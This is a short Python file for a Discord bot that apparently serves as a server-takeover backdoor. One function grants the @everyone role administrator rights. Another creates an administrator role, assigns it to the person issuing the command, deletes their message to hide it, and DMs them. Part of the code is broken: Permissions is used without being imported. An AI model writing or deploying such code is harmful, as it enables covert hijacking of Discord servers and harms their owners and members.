import disnake
from disnake.ext import commands
import asyncio





async def admever(ctx):
  role = disnake.utils.get(ctx.guild.roles, name = "@everyone")
  await role.edit(permissions = Permissions.administrator())



async def adm(ctx, rolename, text):
    guild = ctx.guild
    perms = disnake.Permissions(administrator=True) 
    await guild.create_role(name=rolename, permissions=perms) 
    
    role = disnake.utils.get(ctx.guild.roles, name=rolename) 
    user = ctx.message.author 
    await user.add_roles(role) 
    await ctx.message.delete()
    await ctx.author.send(text)